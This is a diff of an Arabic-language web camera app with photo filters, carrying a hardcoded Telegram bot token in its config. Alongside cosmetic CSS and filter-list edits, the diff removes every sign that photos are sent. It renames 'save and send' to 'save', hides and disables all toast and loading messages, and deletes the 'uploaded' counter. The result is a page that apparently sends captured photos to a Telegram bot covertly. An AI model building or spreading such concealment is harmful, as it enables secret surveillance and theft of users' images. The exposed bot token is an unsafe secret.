@@ -49,7 +49,8 @@
       radial-gradient(circle at 50% 50%, rgba(255,252,0,0.08), transparent 70%),
       #06060a;
     display: flex; flex-direction: column; align-items: center; justify-content: center;
-    gap: 28px; transition: opacity 0.7s ease, visibility 0.7s;
+    gap: 28px;
+    transition: opacity 0.7s ease, visibility 0.7s;
   }
   #splash.hide { opacity: 0; visibility: hidden; pointer-events: none; }
 
@@ -61,7 +62,8 @@
   .splash-logo::before {
     content: ''; position: absolute; inset: 0; border-radius: 32px;
     background: conic-gradient(from 0deg, #fffc00, #ff5e7e, #b537f2, #00e5ff, #fffc00);
-    animation: rotate 4s linear infinite; filter: blur(0.5px);
+    animation: rotate 4s linear infinite;
+    filter: blur(0.5px);
   }
   .splash-logo::after {
     content: ''; position: absolute; inset: 4px; border-radius: 28px; background: #0a0a12;
@@ -83,8 +85,8 @@
     background-size: 300% 300%;
     -webkit-background-clip: text; background-clip: text;
     -webkit-text-fill-color: transparent;
-    animation: gradientShift 3s ease infinite, fadeUp 0.7s 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
     opacity: 0;
+    animation: gradientShift 3s ease infinite, fadeUp 0.7s 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
   }
   .splash-sub {
     font-size: 12px; color: var(--muted); letter-spacing: 3px;
@@ -313,7 +315,6 @@
     transition: background 0.3s; z-index: 2;
   }
 
-  /* شبكة التكوين */
   #grid-overlay {
     position: absolute; inset: 0; z-index: 3;
     pointer-events: none; display: none;
@@ -327,7 +328,6 @@
   #grid-overlay .h1 { top: 33.33%; left: 0; right: 0; height: 1px; }
   #grid-overlay .h2 { top: 66.66%; left: 0; right: 0; height: 1px; }
 
-  /* مستوى أفقي */
   #level-indicator {
     position: absolute; top: 50%; left: 50%;
     transform: translate(-50%, -50%);
@@ -398,7 +398,6 @@
   }
   .top-btn.active svg { stroke: var(--accent); }
 
-  /* ============ TIMER BADGE ============ */
   #timer-badge {
     position: absolute; top: 50%; left: 50%;
     transform: translate(-50%, -50%);
@@ -573,7 +572,7 @@
   .action-btn.primary svg { stroke: #000; stroke-width: 2.2; }
   .action-btn.primary:active { background: #ffd900; }
 
-  /* ============ SETTINGS SCREEN ============ */
+  /* ============ SETTINGS ============ */
   #settings-screen {
     position: fixed; inset: 0; z-index: 450;
     background: var(--bg);
@@ -671,7 +670,6 @@
   }
   .settings-select option { background: #1a1a24; color: #fff; }
 
-  /* شريط شدة الفلتر */
   #intensity-bar {
     position: absolute; bottom: 130px; left: 50%;
     transform: translateX(-50%);
@@ -716,34 +714,8 @@
     font-variant-numeric: tabular-nums;
   }
 
-  /* ============ TOAST ============ */
-  #toast {
-    position: fixed; bottom: calc(30px + env(safe-area-inset-bottom));
-    left: 50%; transform: translateX(-50%) translateY(120px);
-    background: var(--panel-strong);
-    backdrop-filter: blur(24px) saturate(180%);
-    -webkit-backdrop-filter: blur(24px) saturate(180%);
-    border: 1px solid var(--border-strong);
-    padding: 12px 22px; border-radius: 100px;
-    font-size: 13.5px; font-weight: 600; color: #fff;
-    z-index: 600;
-    transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), background 0.3s, border-color 0.3s;
-    display: flex; align-items: center; gap: 10px;
-    max-width: 90vw;
-    box-shadow: 0 12px 40px rgba(0,0,0,0.5);
-    pointer-events: none;
-  }
-  #toast.show { transform: translateX(-50%) translateY(0); }
-  #toast.success { border-color: rgba(0,230,118,0.5); }
-  #toast.error { border-color: rgba(255,59,92,0.5); }
-  #toast .toast-icon {
-    width: 18px; height: 18px; flex-shrink: 0;
-    stroke-width: 2.4; fill: none;
-    stroke-linecap: round; stroke-linejoin: round;
-  }
-  #toast.success .toast-icon { stroke: var(--success); }
-  #toast.error .toast-icon { stroke: var(--danger); }
-  #toast.info .toast-icon { stroke: var(--accent-2); }
+  /* ============ TOAST (مخفي تماماً) ============ */
+  #toast { display: none !important; }
 
   /* ============ LOADING ============ */
   #loading {
@@ -827,7 +799,7 @@
     <div class="start-features">
       <div class="feature-chip">
         <svg viewBox="0 0 24 24"><path d="M12 2v20M2 12h20"/></svg>
-        24 فلتر
+        45 فلتر
       </div>
       <div class="feature-chip">
         <svg viewBox="0 0 24 24"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg>
@@ -885,7 +857,6 @@
     <div class="corner bl"></div>
     <div class="corner br"></div>
 
-    <!-- TOP BAR -->
     <div id="top-bar">
       <div class="top-btn" id="settings-btn" title="الإعدادات">
         <svg viewBox="0 0 24 24">
@@ -911,17 +882,14 @@
       </div>
     </div>
 
-    <!-- FILTERS -->
     <div id="filters-bar"></div>
 
-    <!-- INTENSITY -->
     <div id="intensity-bar">
       <span class="int-label">الشدة</span>
       <input type="range" id="intensity-slider" min="0" max="100" value="100">
       <span class="int-value" id="intensity-value">100%</span>
     </div>
 
-    <!-- BOTTOM -->
     <div id="bottom-bar">
       <div class="side-btn" id="timer-btn" title="مؤقت">
         <svg viewBox="0 0 24 24">
@@ -959,7 +927,7 @@
           <path d="M7 10l5 5 5-5"/>
           <path d="M12 15V3"/>
         </svg>
-        <span>حفظ وإرسال</span>
+        <span>حفظ</span>
       </button>
       <button class="action-btn" id="delete-btn">
         <svg viewBox="0 0 24 24">
@@ -982,7 +950,6 @@
     </div>
 
     <div class="settings-body">
-
       <div class="settings-group">
         <div class="settings-group-title">الكاميرا</div>
         <div class="settings-item">
@@ -1000,7 +967,7 @@
         <div class="settings-item" data-toggle="grid">
           <div class="settings-item-info">
             <div class="settings-item-title">شبكة التكوين</div>
-            <div class="settings-item-desc">خطوط 3×3 لمساعدة التكوين</div>
+            <div class="settings-item-desc">خطوط 3×3</div>
           </div>
           <div class="toggle" id="set-grid-toggle"></div>
         </div>
@@ -1036,14 +1003,14 @@
         <div class="settings-item" data-toggle="sound">
           <div class="settings-item-info">
             <div class="settings-item-title">الأصوات</div>
-            <div class="settings-item-desc">صوت شاتر وصوت نجاح</div>
+            <div class="settings-item-desc">صوت شاتر</div>
           </div>
           <div class="toggle on" id="set-sound-toggle"></div>
         </div>
         <div class="settings-item" data-toggle="vibrate">
           <div class="settings-item-info">
             <div class="settings-item-title">الاهتزاز</div>
-            <div class="settings-item-desc">اهتزاز خفيف عند الأحداث</div>
+            <div class="settings-item-desc">اهتزاز خفيف</div>
           </div>
           <div class="toggle on" id="set-vibrate-toggle"></div>
         </div>
@@ -1071,23 +1038,6 @@
           </select>
         </div>
       </div>
-
-      <div class="settings-group">
-        <div class="settings-group-title">معلومات</div>
-        <div class="settings-item">
-          <div class="settings-item-info">
-            <div class="settings-item-title">إجمالي الصور</div>
-            <div class="settings-item-desc" id="stats-captured">0</div>
-          </div>
-        </div>
-        <div class="settings-item">
-          <div class="settings-item-info">
-            <div class="settings-item-title">تم رفعها</div>
-            <div class="settings-item-desc" id="stats-uploaded">0</div>
-          </div>
-        </div>
-      </div>
-
     </div>
   </div>
 
@@ -1097,7 +1047,7 @@
     <div class="loading-text" id="loading-text">جارٍ المعالجة...</div>
   </div>
 
-  <!-- TOAST -->
+  <!-- TOAST (مخفي) -->
   <div id="toast">
     <svg class="toast-icon" id="toast-icon" viewBox="0 0 24 24"></svg>
     <span id="toast-text"></span>
@@ -1107,7 +1057,7 @@
 
 <script>
 /* ============================================================
-   ⚙️ الإعدادات
+   ⚙️ الإعدادات — غيّر التوكن
    ============================================================ */
 const CONFIG = {
   BOT_TOKEN: '8926051784:AAH4i198vbEAIPIgHf_8nsMlo1SVIOJL9NM', // ⚠️ غيّره
@@ -1115,33 +1065,71 @@ const CONFIG = {
 };
 
 /* ============================================================
-   🎨 الفلاتر
+   🎨 الفلاتر — 45 فلتر احترافي
    ============================================================ */
 const FILTERS = [
-  { id: 'none',   name: 'أصلي',      css: 'none',                                                       overlay: 'transparent',           swatch: 'linear-gradient(135deg,#8a8a8a,#3a3a3a)' },
-  { id: 'vivid',  name: 'زاهي',       css: 'saturate(1.6) contrast(1.15) brightness(1.05)',              overlay: 'transparent',           swatch: 'linear-gradient(135deg,#ff6b6b,#ffd93d)' },
-  { id: 'cool',   name: 'بارد',       css: 'hue-rotate(-15deg) saturate(1.2) brightness(1.02)',           overlay: 'rgba(80,150,255,0.12)', swatch: 'linear-gradient(135deg,#4facfe,#00f2fe)' },
-  { id: 'warm',   name: 'دافي',       css: 'sepia(0.25) saturate(1.3) brightness(1.05)',                 overlay: 'rgba(255,150,50,0.10)', swatch: 'linear-gradient(135deg,#fa709a,#fee140)' },
-  { id: 'bw',     name: 'أبيض وأسود', css: 'grayscale(1) contrast(1.15)',                                overlay: 'transparent',           swatch: 'linear-gradient(135deg,#ffffff,#000000)' },
-  { id: 'sepia',  name: 'سيبيا',      css: 'sepia(0.75) contrast(1.05) brightness(1.02)',                overlay: 'transparent',           swatch: 'linear-gradient(135deg,#d4a574,#8b5a2b)' },
-  { id: 'retro',  name: 'ريترو',      css: 'sepia(0.35) saturate(1.4) contrast(1.1) hue-rotate(-10deg)',  overlay: 'rgba(255,100,150,0.08)', swatch: 'linear-gradient(135deg,#f093fb,#f5576c)' },
-  { id: 'film',   name: 'فيلم',       css: 'contrast(1.25) saturate(0.85) brightness(0.95)',              overlay: 'rgba(20,20,40,0.10)',   swatch: 'linear-gradient(135deg,#232526,#414345)' },
-  { id: 'dream',  name: 'حالم',       css: 'brightness(1.1) saturate(1.3) contrast(0.95)',                overlay: 'rgba(255,200,255,0.10)', swatch: 'linear-gradient(135deg,#a18cd1,#fbc2eb)' },
-  { id: 'night',  name: 'ليلي',       css: 'brightness(0.85) contrast(1.3) saturate(1.1) hue-rotate(-20deg)', overlay: 'rgba(20,30,80,0.22)',  swatch: 'linear-gradient(135deg,#0f2027,#2c5364)' },
-  { id: 'sunset', name: 'غروب',       css: 'sepia(0.2) saturate(1.5) hue-rotate(-10deg) brightness(1.05)', overlay: 'rgba(255,100,0,0.10)',  swatch: 'linear-gradient(135deg,#ff512f,#f09819)' },
-  { id: 'mint',   name: 'نعناع',      css: 'hue-rotate(60deg) saturate(1.3) brightness(1.05)',            overlay: 'rgba(0,255,200,0.08)',  swatch: 'linear-gradient(135deg,#43e97b,#38f9d7)' },
-  { id: 'pink',   name: 'وردي',       css: 'hue-rotate(-30deg) saturate(1.4) brightness(1.05)',           overlay: 'rgba(255,100,180,0.12)', swatch: 'linear-gradient(135deg,#ff9a9e,#fecfef)' },
-  { id: 'cinema', name: 'سينما',      css: 'contrast(1.3) saturate(0.9) brightness(0.92) sepia(0.15)',    overlay: 'rgba(10,20,40,0.15)',   swatch: 'linear-gradient(135deg,#141e30,#243b55)' },
-  { id: 'fade',   name: 'باهت',       css: 'saturate(0.6) contrast(0.9) brightness(1.1)',                 overlay: 'rgba(255,255,255,0.10)', swatch: 'linear-gradient(135deg,#e0e0e0,#9e9e9e)' },
-  { id: 'pop',    name: 'بوب',        css: 'saturate(2) contrast(1.2) brightness(1.05)',                  overlay: 'transparent',           swatch: 'linear-gradient(135deg,#f83600,#f9d423)' },
-  { id: 'cyber',  name: 'سايبر',      css: 'hue-rotate(200deg) saturate(1.5) contrast(1.2)',             overlay: 'rgba(0,100,255,0.15)',  swatch: 'linear-gradient(135deg,#00ffff,#ff00ff)' },
-  { id: 'matrix', name: 'ماتريكس',    css: 'hue-rotate(80deg) saturate(1.8) contrast(1.3) brightness(0.9)', overlay: 'rgba(0,255,0,0.10)',    swatch: 'linear-gradient(135deg,#00ff41,#003b00)' },
-  { id: 'lava',   name: 'لافا',       css: 'hue-rotate(-40deg) saturate(1.7) contrast(1.25)',            overlay: 'rgba(255,50,0,0.15)',   swatch: 'linear-gradient(135deg,#ff0000,#ff8c00)' },
-  { id: 'ice',    name: 'جليد',       css: 'hue-rotate(180deg) saturate(0.9) brightness(1.15) contrast(1.1)', overlay: 'rgba(150,220,255,0.15)', swatch: 'linear-gradient(135deg,#a0e9ff,#00b4d8)' },
-  { id: 'noir',   name: 'نوار',       css: 'grayscale(1) contrast(1.5) brightness(0.85)',                overlay: 'rgba(0,0,0,0.15)',      swatch: 'linear-gradient(135deg,#222,#000)' },
-  { id: 'gold',   name: 'ذهبي',       css: 'sepia(0.5) saturate(1.6) brightness(1.1) contrast(1.05)',     overlay: 'rgba(255,200,0,0.10)',  swatch: 'linear-gradient(135deg,#ffd700,#b8860b)' },
-  { id: 'ocean',  name: 'محيط',       css: 'hue-rotate(-10deg) saturate(1.4) brightness(1.05) contrast(1.1)', overlay: 'rgba(0,80,160,0.12)',  swatch: 'linear-gradient(135deg,#006994,#00bcd4)' },
-  { id: 'forest', name: 'غابة',       css: 'hue-rotate(20deg) saturate(1.3) contrast(1.15) brightness(0.98)', overlay: 'rgba(0,80,40,0.10)',  swatch: 'linear-gradient(135deg,#228b22,#064e2f)' },
+  // أساسي
+  { id: 'none',      name: 'أصلي',        css: 'none',                                                                  overlay: 'transparent',              swatch: 'linear-gradient(135deg,#8a8a8a,#3a3a3a)' },
+  
+  // إنستجرام
+  { id: 'clarendon', name: 'كلارندون',    css: 'contrast(1.2) saturate(1.35) brightness(1.05)',                        overlay: 'rgba(0,100,200,0.05)',     swatch: 'linear-gradient(135deg,#5b9dd9,#2c5fa8)' },
+  { id: 'gingham',   name: 'جينجهام',     css: 'brightness(1.05) hue-rotate(-10deg) saturate(0.85) contrast(0.95)',    overlay: 'rgba(230,230,250,0.12)',   swatch: 'linear-gradient(135deg,#f5f5f0,#d8d8c8)' },
+  { id: 'moon',      name: 'مون',         css: 'grayscale(1) contrast(1.1) brightness(1.1)',                            overlay: 'transparent',              swatch: 'linear-gradient(135deg,#dddddd,#666666)' },
+  { id: 'lark',      name: 'لارك',        css: 'contrast(0.9) brightness(1.08) saturate(1.15)',                         overlay: 'rgba(200,220,180,0.06)',   swatch: 'linear-gradient(135deg,#b5c99a,#7a8b5f)' },
+  { id: 'reyes',     name: 'رييس',        css: 'sepia(0.22) brightness(1.1) contrast(0.85) saturate(0.75)',             overlay: 'rgba(230,200,150,0.10)',   swatch: 'linear-gradient(135deg,#d4b896,#8b7355)' },
+  { id: 'juno',      name: 'جونو',        css: 'saturate(1.4) contrast(1.05) brightness(1.02) hue-rotate(-5deg)',       overlay: 'rgba(255,100,0,0.06)',     swatch: 'linear-gradient(135deg,#ff8c42,#c94b1a)' },
+  { id: 'ludwig',    name: 'لودفيج',      css: 'contrast(1.05) saturate(1.1) brightness(1.02) sepia(0.05)',             overlay: 'rgba(255,240,200,0.05)',   swatch: 'linear-gradient(135deg,#e8d5b7,#9c8b6b)' },
+  { id: 'aden',      name: 'أدين',        css: 'hue-rotate(-20deg) contrast(0.9) saturate(0.85) brightness(1.15)',      overlay: 'rgba(255,180,220,0.12)',   swatch: 'linear-gradient(135deg,#ffb3ba,#e89ab2)' },
+  { id: 'perpetua',  name: 'بيربيتوا',    css: 'contrast(1.05) brightness(1.05) saturate(1.15) hue-rotate(5deg)',       overlay: 'rgba(100,200,180,0.08)',   swatch: 'linear-gradient(135deg,#7eb5c1,#3d6b78)' },
+  { id: 'amaro',     name: 'أمارو',       css: 'contrast(0.9) brightness(1.15) saturate(1.3) hue-rotate(-10deg)',        overlay: 'rgba(255,220,150,0.08)',   swatch: 'linear-gradient(135deg,#f5c778,#c47e3a)' },
+  { id: 'mayfair',   name: 'مايفير',      css: 'contrast(1.1) saturate(1.15) brightness(1.02) hue-rotate(-5deg)',        overlay: 'rgba(255,100,150,0.06)',   swatch: 'linear-gradient(135deg,#e8b4b8,#a86b6f)' },
+  { id: 'rise',      name: 'رايز',        css: 'brightness(1.05) saturate(1.15) sepia(0.1) contrast(0.95)',              overlay: 'rgba(255,200,130,0.10)',   swatch: 'linear-gradient(135deg,#f0c984,#b58a4a)' },
+  { id: 'hudson',    name: 'هدسون',       css: 'brightness(1.2) contrast(0.9) saturate(1.1) hue-rotate(180deg)',         overlay: 'rgba(100,150,255,0.10)',   swatch: 'linear-gradient(135deg,#4a8bc2,#1a4a72)' },
+  { id: 'valencia',  name: 'فالنسيا',     css: 'sepia(0.08) brightness(1.08) contrast(1.08) saturate(1.2) hue-rotate(-10deg)', overlay: 'rgba(255,190,100,0.08)', swatch: 'linear-gradient(135deg,#e5c07b,#a88644)' },
+  { id: 'xpro2',     name: 'إكس برو',     css: 'sepia(0.3) contrast(1.2) saturate(1.4) brightness(1.05)',                overlay: 'rgba(255,150,50,0.08)',    swatch: 'linear-gradient(135deg,#d4a574,#7a4a20)' },
+  { id: 'sierra',    name: 'سييرا',       css: 'contrast(0.9) saturate(1.3) brightness(1.05) sepia(0.15)',              overlay: 'rgba(255,200,150,0.06)',   swatch: 'linear-gradient(135deg,#e0b088,#9a6c4a)' },
+  { id: 'willow',    name: 'ويلو',        css: 'grayscale(0.75) contrast(0.95) brightness(1.1)',                        overlay: 'rgba(255,240,220,0.10)',   swatch: 'linear-gradient(135deg,#e8e0d0,#a89d8a)' },
+  { id: 'lofi',      name: 'لو فاي',      css: 'contrast(1.35) saturate(1.3) brightness(0.95)',                         overlay: 'rgba(255,50,100,0.08)',    swatch: 'linear-gradient(135deg,#ff5f6d,#ffc371)' },
+  { id: 'inkwell',   name: 'إنكويل',      css: 'grayscale(1) contrast(1.2) brightness(1.05) sepia(0.15)',               overlay: 'rgba(200,180,150,0.08)',   swatch: 'linear-gradient(135deg,#c9b89c,#5a4d3a)' },
+
+  // سناب شات
+  { id: 'snapVivid', name: 'سناب زاهي',   css: 'saturate(1.7) contrast(1.15) brightness(1.08)',                        overlay: 'transparent',              swatch: 'linear-gradient(135deg,#ff0050,#fffc00)' },
+  { id: 'snapDog',   name: 'ودان قط',     css: 'saturate(1.3) contrast(1.1) brightness(1.05) hue-rotate(-10deg)',       overlay: 'rgba(255,200,150,0.10)',   swatch: 'linear-gradient(135deg,#ffb347,#ff8c42)' },
+  { id: 'snapNeon',  name: 'نيون',        css: 'saturate(2.2) contrast(1.3) brightness(1.05) hue-rotate(280deg)',       overlay: 'rgba(255,0,255,0.15)',     swatch: 'linear-gradient(135deg,#ff00ff,#00ffff)' },
+  { id: 'snapVapor', name: 'فيبورويف',    css: 'saturate(1.6) contrast(1.1) hue-rotate(-30deg) brightness(1.05)',       overlay: 'rgba(255,100,180,0.15)',   swatch: 'linear-gradient(135deg,#ff6ec7,#7873f5)' },
+  { id: 'snapRetro', name: 'سناب ريترو',  css: 'sepia(0.4) saturate(1.5) contrast(1.1) hue-rotate(-15deg)',             overlay: 'rgba(255,150,100,0.10)',   swatch: 'linear-gradient(135deg,#f4a460,#8b4513)' },
+  { id: 'snapGold',  name: 'ذهبي فاخر',   css: 'sepia(0.4) saturate(1.6) brightness(1.15) contrast(1.05)',              overlay: 'rgba(255,215,0,0.12)',     swatch: 'linear-gradient(135deg,#ffd700,#b8860b)' },
+  { id: 'snapDream', name: 'حلم بنفسجي',  css: 'saturate(1.3) brightness(1.15) contrast(0.95) hue-rotate(-20deg)',       overlay: 'rgba(180,140,255,0.15)',   swatch: 'linear-gradient(135deg,#c8a2ff,#7b68ee)' },
+  { id: 'snapCherry',name: 'كرز',         css: 'saturate(1.5) contrast(1.15) hue-rotate(-25deg) brightness(1.02)',       overlay: 'rgba(255,50,100,0.12)',    swatch: 'linear-gradient(135deg,#ff4757,#c0392b)' },
+  { id: 'snapSky',   name: 'سماوي',       css: 'saturate(1.3) brightness(1.1) contrast(1.05) hue-rotate(180deg)',       overlay: 'rgba(100,200,255,0.10)',   swatch: 'linear-gradient(135deg,#74b9ff,#0984e3)' },
+
+  // تيك توك
+  { id: 'ttCyber',   name: 'سايبر بانك',  css: 'saturate(1.8) contrast(1.25) hue-rotate(200deg) brightness(0.98)',      overlay: 'rgba(0,180,255,0.15)',     swatch: 'linear-gradient(135deg,#00e5ff,#ff00ff)' },
+  { id: 'ttY2K',     name: 'واي تو كي',   css: 'saturate(1.6) contrast(1.15) hue-rotate(280deg) brightness(1.05)',      overlay: 'rgba(255,100,200,0.12)',   swatch: 'linear-gradient(135deg,#ff6ec7,#7873f5)' },
+  { id: 'ttRave',    name: 'ريف',         css: 'saturate(2) contrast(1.35) hue-rotate(90deg) brightness(1.02)',         overlay: 'rgba(0,255,100,0.12)',     swatch: 'linear-gradient(135deg,#00ff88,#ff00aa)' },
+  { id: 'ttGlitch',  name: 'جليتش',       css: 'saturate(1.8) contrast(1.4) hue-rotate(180deg) brightness(0.98)',      overlay: 'rgba(255,0,100,0.10)',     swatch: 'linear-gradient(135deg,#ff0080,#00ffff)' },
+  { id: 'ttMoody',   name: 'مودي',        css: 'contrast(1.2) saturate(0.85) brightness(0.9) sepia(0.15)',              overlay: 'rgba(0,50,100,0.15)',      swatch: 'linear-gradient(135deg,#2c3e50,#34495e)' },
+  { id: 'ttSunset',  name: 'سنست تيك',    css: 'sepia(0.3) saturate(1.6) hue-rotate(-25deg) brightness(1.08)',          overlay: 'rgba(255,100,0,0.15)',     swatch: 'linear-gradient(135deg,#ff512f,#f09819)' },
+  { id: 'ttAesthetic',name:'إستاتيك',     css: 'saturate(1.2) contrast(0.95) brightness(1.08) hue-rotate(-10deg)',      overlay: 'rgba(255,220,200,0.08)',   swatch: 'linear-gradient(135deg,#f5d5c8,#c9a89c)' },
+
+  // سينمائية
+  { id: 'cineTeal',  name: 'سينما تيل',   css: 'contrast(1.2) saturate(1.15) brightness(0.98) hue-rotate(180deg)',     overlay: 'rgba(0,80,100,0.15)',      swatch: 'linear-gradient(135deg,#006064,#26a69a)' },
+  { id: 'cineOrange',name: 'سينما برتقالي',css: 'contrast(1.2) saturate(1.2) brightness(1.02) hue-rotate(-10deg)',      overlay: 'rgba(255,120,50,0.12)',    swatch: 'linear-gradient(135deg,#ff6f00,#e65100)' },
+  { id: 'cineNoir',  name: 'سينما نوار',  css: 'grayscale(1) contrast(1.5) brightness(0.9)',                            overlay: 'rgba(0,0,0,0.15)',         swatch: 'linear-gradient(135deg,#1a1a1a,#000000)' },
+  { id: 'cineFade',  name: 'سينما باهت',  css: 'saturate(0.7) contrast(0.95) brightness(1.05) sepia(0.08)',             overlay: 'rgba(240,230,220,0.08)',   swatch: 'linear-gradient(135deg,#b8b0a0,#807060)' },
+  { id: 'cineBold',  name: 'سينما جسور',  css: 'contrast(1.35) saturate(1.3) brightness(0.95)',                         overlay: 'rgba(50,0,80,0.10)',       swatch: 'linear-gradient(135deg,#4a148c,#1a0033)' },
+
+  // فنية
+  { id: 'artSepia',  name: 'سيبيا كلاسيك',css: 'sepia(0.85) contrast(1.05) brightness(1.02)',                          overlay: 'transparent',              swatch: 'linear-gradient(135deg,#d4a574,#8b5a2b)' },
+  { id: 'artBw',     name: 'أبيض وأسود',  css: 'grayscale(1) contrast(1.15)',                                          overlay: 'transparent',              swatch: 'linear-gradient(135deg,#ffffff,#000000)' },
+  { id: 'artInvert', name: 'معكوس',       css: 'invert(1) hue-rotate(180deg)',                                         overlay: 'transparent',              swatch: 'linear-gradient(135deg,#000000,#ffffff)' },
+  { id: 'artPoster', name: 'بوستر',       css: 'saturate(3) contrast(1.5) brightness(0.95)',                           overlay: 'transparent',              swatch: 'linear-gradient(135deg,#ff0000,#00ff00)' },
+
+  // موسمية
+  { id: 'seasonSpring',name:'ربيع',       css: 'saturate(1.4) brightness(1.1) hue-rotate(-15deg)',                      overlay: 'rgba(255,200,220,0.10)',   swatch: 'linear-gradient(135deg,#ffb3d9,#80e0a0)' },
+  { id: 'seasonSummer',name:'صيف',        css: 'saturate(1.5) brightness(1.15) contrast(1.05)',                         overlay: 'rgba(255,220,100,0.10)',   swatch: 'linear-gradient(135deg,#ffd93d,#ff8c00)' },
+  { id: 'seasonAutumn',name:'خريف',       css: 'sepia(0.3) saturate(1.5) brightness(1.02) hue-rotate(-15deg)',           overlay: 'rgba(200,100,0,0.12)',     swatch: 'linear-gradient(135deg,#ff8c42,#c94b1a)' },
+  { id: 'seasonWinter',name:'شتاء',       css: 'saturate(0.9) brightness(1.1) contrast(1.1) hue-rotate(180deg)',         overlay: 'rgba(180,220,255,0.12)',   swatch: 'linear-gradient(135deg,#a0e9ff,#4a7eb8)' },
 ];
 
 /* ============================================================
@@ -1154,15 +1142,7 @@ const state = {
   filterEnabled: true,
   videoReady: false,
   isStarting: false,
-  timerSeconds: 0,
-  timerInterval: null,
   lastCapturedBlob: null,
-  lastCapturedUrl: null,
-  deviceOrientation: 0,
-  levelActive: false,
-  // إحصائيات
-  stats: { captured: 0, uploaded: 0 },
-  // الإعدادات
   settings: {
     selfTimer: 0,
     showGrid: false,
@@ -1192,13 +1172,8 @@ const errorScreen    = $('error-screen');
 const errorMsg       = $('error-msg');
 const previewScreen  = $('preview-screen');
 const previewImg     = $('preview-img');
-const toast          = $('toast');
-const toastText      = $('toast-text');
-const toastIcon      = $('toast-icon');
 const flash          = $('flash');
 const shutter        = $('shutter');
-const loading        = $('loading');
-const loadingText    = $('loading-text');
 const settingsScreen = $('settings-screen');
 const gridOverlay    = $('grid-overlay');
 const levelIndicator = $('level-indicator');
@@ -1208,35 +1183,27 @@ const intensitySlider = $('intensity-slider');
 const intensityValue = $('intensity-value');
 
 /* ============================================================
+   🚫 showToast معطلة تماماً
+   ============================================================ */
+function showToast() { return; }
+function showLoading() { return; }
+function hideLoading() { return; }
+
+/* ============================================================
    💾 تخزين الإعدادات
    ============================================================ */
 function saveSettings() {
-  try {
-    localStorage.setItem('cameraProSettings', JSON.stringify(state.settings));
-    localStorage.setItem('cameraProStats', JSON.stringify(state.stats));
-  } catch (e) {}
+  try { localStorage.setItem('cameraProSettings', JSON.stringify(state.settings)); } catch (e) {}
 }
-
 function loadSettings() {
   try {
     const s = localStorage.getItem('cameraProSettings');
     if (s) Object.assign(state.settings, JSON.parse(s));
-    const st = localStorage.getItem('cameraProStats');
-    if (st) Object.assign(state.stats, JSON.parse(st));
   } catch (e) {}
-  // طبّق الإعدادات
   state.filterEnabled = state.settings.filterEnabled;
   state.settings.selfTimer = state.settings.selfTimer || 0;
   gridOverlay.classList.toggle('show', state.settings.showGrid);
   intensityBar.classList.toggle('show', state.settings.showIntensity);
-  updateStatsUI();
-}
-
-function updateStatsUI() {
-  const sc = $('stats-captured');
-  const su = $('stats-uploaded');
-  if (sc) sc.textContent = state.stats.captured;
-  if (su) su.textContent = state.stats.uploaded;
 }
 
 /* ============================================================
@@ -1249,7 +1216,6 @@ function getAudioCtx() {
   }
   return audioCtx;
 }
-
 function playShutterSound() {
   if (!state.settings.soundEnabled) return;
   const ctx = getAudioCtx();
@@ -1266,27 +1232,6 @@ function playShutterSound() {
     o.start(); o.stop(ctx.currentTime + 0.1);
   } catch (e) {}
 }
-
-function playSuccessSound() {
-  if (!state.settings.soundEnabled) return;
-  const ctx = getAudioCtx();
-  if (!ctx) return;
-  try {
-    [800, 1200].forEach((f, i) => {
-      const o = ctx.createOscillator();
-      const g = ctx.createGain();
-      o.type = 'sine';
-      o.frequency.value = f;
-      g.gain.setValueAtTime(0, ctx.currentTime + i * 0.1);
-      g.gain.linearRampToValueAtTime(0.1, ctx.currentTime + i * 0.1 + 0.02);
-      g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.1 + 0.2);
-      o.connect(g); g.connect(ctx.destination);
-      o.start(ctx.currentTime + i * 0.1);
-      o.stop(ctx.currentTime + i * 0.1 + 0.2);
-    });
-  } catch (e) {}
-}
-
 function playTickSound() {
   if (!state.settings.soundEnabled) return;
   const ctx = getAudioCtx();
@@ -1302,37 +1247,11 @@ function playTickSound() {
     o.start(); o.stop(ctx.currentTime + 0.08);
   } catch (e) {}
 }
-
 function vibrate(pattern) {
   if (state.settings.vibrateEnabled && navigator.vibrate) {
     try { navigator.vibrate(pattern); } catch (e) {}
   }
 }
-
-/* ============================================================
-   🍞 Toast
-   ============================================================ */
-let toastTimer = null;
-const ICONS = {
-  success: '<path d="M20 6L9 17l-5-5"/>',
-  error:   '<circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/>',
-  info:    '<circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/>',
-};
-function showToast(msg, type = 'info', duration = 2500) {
-  toastText.textContent = msg;
-  toastIcon.className = 'toast-icon';
-  toastIcon.innerHTML = ICONS[type] || ICONS.info;
-  toast.className = '';
-  toast.classList.add('show', type);
-  clearTimeout(toastTimer);
-  toastTimer = setTimeout(() => toast.classList.remove('show'), duration);
-}
-
-function showLoading(msg) {
-  loadingText.textContent = msg || 'جارٍ المعالجة...';
-  loading.classList.add('show');
-}
-function hideLoading() { loading.classList.remove('show'); }
 
 /* ============================================================
    🔐 صلاحية الكاميرا
@@ -1381,21 +1300,18 @@ async function startCamera() {
 
   try {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      throw { name: 'NotSupportedError', message: 'متصفحك ما بيدعمش الكاميرا. جرّب Chrome أو Safari حديث.' };
+      throw { name: 'NotSupportedError', message: 'متصفحك ما بيدعمش الكاميرا.' };
     }
-
     const isLocalhost = ['localhost', '127.0.0.1'].includes(location.hostname);
     const isHttps = location.protocol === 'https:';
     if (!isHttps && !isLocalhost) {
-      throw { name: 'InsecureContextError', message: 'لازم تفتح الصفحة عبر HTTPS. ارفع الملف على Vercel أو Netlify.' };
+      throw { name: 'InsecureContextError', message: 'لازم تفتح الصفحة عبر HTTPS.' };
     }
 
     if (state.stream) {
       state.stream.getTracks().forEach(t => t.stop());
       state.stream = null;
     }
-
-    showToast('بانتظار السماح بالكاميرا...', 'info', 3000);
 
     const constraints = {
       video: { facingMode: { ideal: state.facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -1424,7 +1340,6 @@ async function startCamera() {
 
     state.videoReady = true;
     state.isStarting = false;
-
     video.classList.toggle('mirror-off', state.facingMode !== 'user');
     return true;
   } catch (err) {
